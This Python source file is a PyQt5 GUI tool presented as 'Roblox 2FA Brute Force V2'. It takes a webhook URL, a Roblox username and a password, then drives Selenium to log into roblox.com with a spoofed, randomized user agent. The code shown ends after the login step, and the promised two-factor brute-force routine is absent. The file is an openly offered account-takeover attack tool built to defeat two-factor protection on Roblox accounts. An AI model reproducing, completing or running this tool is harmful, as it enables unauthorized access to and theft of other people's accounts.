# Copyright (c)  (https://discord.gg/pQUFjaJ2EN)
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

import sys
import os
import time
import random
import requests
import threading
from pynput.keyboard import Controller, Key
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from PyQt5.QtWidgets import (QApplication, QWidget, QVBoxLayout, QLabel, QLineEdit, QPushButton, QMessageBox, QComboBox, QProgressBar, QTextEdit)
from PyQt5.QtGui import QColor, QPalette
from PyQt5.QtCore import Qt


keyboard = Controller()

class TwoFABruteForceGUI(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Roblox 2FA Brute Force V2 - Advanced Black & Purple Theme")
        self.setFixedSize(800, 500)
        self.setStyleSheet("background-color: #0f0f17; color: #A855F7; font-size: 18px;")
        self.initUI()

    def initUI(self):
        layout = QVBoxLayout()

        
        self.webhookInput = QLineEdit()
        self.webhookInput.setPlaceholderText("Enter Webhook URL...")
        self.webhookInput.setStyleSheet("background-color: #1a1a2e; padding: 10px; border: none; color: #A855F7;")
        layout.addWidget(QLabel("Webhook URL:"))
        layout.addWidget(self.webhookInput)

        self.usernameInput = QLineEdit()
        self.usernameInput.setPlaceholderText("Enter Roblox Username...")
        self.usernameInput.setStyleSheet("background-color: #1a1a2e; padding: 10px; border: none; color: #A855F7;")
        layout.addWidget(QLabel("Roblox Username:"))
        layout.addWidget(self.usernameInput)

        self.passwordInput = QLineEdit()
        self.passwordInput.setPlaceholderText("Enter Password...")
        self.passwordInput.setEchoMode(QLineEdit.Password)
        self.passwordInput.setStyleSheet("background-color: #1a1a2e; padding: 10px; border: none; color: #A855F7;")
        layout.addWidget(QLabel("Password:"))
        layout.addWidget(self.passwordInput)

        self.browserSelect = QComboBox()
        self.browserSelect.addItems(["Random", "PC Browser", "Mobile Browser"])
        self.browserSelect.setStyleSheet("background-color: #1a1a2e; padding: 10px; border: none; color: #A855F7;")
        layout.addWidget(QLabel("Select Browser Mode:"))
        layout.addWidget(self.browserSelect)

        self.startButton = QPushButton("Start 2FA Brute Force V2")
        self.startButton.setStyleSheet("background-color: #A855F7; color: white; padding: 10px; font-size: 18px; border-radius: 5px;")
        self.startButton.clicked.connect(self.start_twofa_bruteforce)
        layout.addWidget(self.startButton)

        self.progressBar = QProgressBar()
        self.progressBar.setStyleSheet("QProgressBar {color: white; background-color: #2d2d3d; border: 1px solid #A855F7; padding: 3px; } QProgressBar::chunk { background-color: #A855F7; }")
        layout.addWidget(self.progressBar)

        self.logOutput = QTextEdit()
        self.logOutput.setReadOnly(True)
        self.logOutput.setStyleSheet("background-color: #121212; color: #A855F7; padding: 10px; font-size: 16px;")
        self.logOutput.setPlaceholderText("Logs will appear here...")
        layout.addWidget(self.logOutput)

        self.setLayout(layout)

    def start_twofa_bruteforce(self):
        webhook_url = self.webhookInput.text().strip()
        username = self.usernameInput.text().strip()
        password = self.passwordInput.text().strip()
        browser_mode = self.browserSelect.currentText()

        if not all([webhook_url, username, password, browser_mode]):
            QMessageBox.warning(self, "Error", "All fields are required.")
            return

        confirmation = QMessageBox.question(self, "Confirmation", "Are you sure you want to start the 2FA brute force?", QMessageBox.Yes | QMessageBox.No)
        if confirmation == QMessageBox.Yes:
            threading.Thread(target=self.perform_login_and_bruteforce, args=(webhook_url, username, password, browser_mode)).start()

    def perform_login_and_bruteforce(self, webhook_url, username, password, browser_mode):
        self.logOutput.append("Starting Roblox login...")

        chrome_driver_path = os.path.join(os.getcwd(), 'Inputs', 'chromedriver.exe')
        options = Options()
        options.add_argument('--incognito')
        options.add_argument('--disable-extensions')

        user_agents = {
            "PC Browser": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            "Mobile Browser": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1"
        }

        if browser_mode == "Random":
            browser_mode = random.choice(["PC Browser", "Mobile Browser"])

        options.add_argument(f'user-agent={user_agents.get(browser_mode, user_agents["PC Browser"])}')

        service = Service(chrome_driver_path)
        driver = webdriver.Chrome(service=service, options=options)
        driver.get("https://www.roblox.com/Login")

        try:
            driver.find_element(By.ID, "login-username").send_keys(username)
            driver.find_element(By.ID, "login-password").send_keys(password)
            driver.find_element(By.ID, "login-button").click()
            self.logOutput.append("Logged in successfully. Waiting 10 seconds before starting 2FA brute force...")
            time.sleep(10)
        except Exception as e:
            self.logOutput.append(f"Login Error: {e}")
            driver.quit()
            return

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = TwoFABruteForceGUI()
    window.show()
    sys.exit(app.exec_())

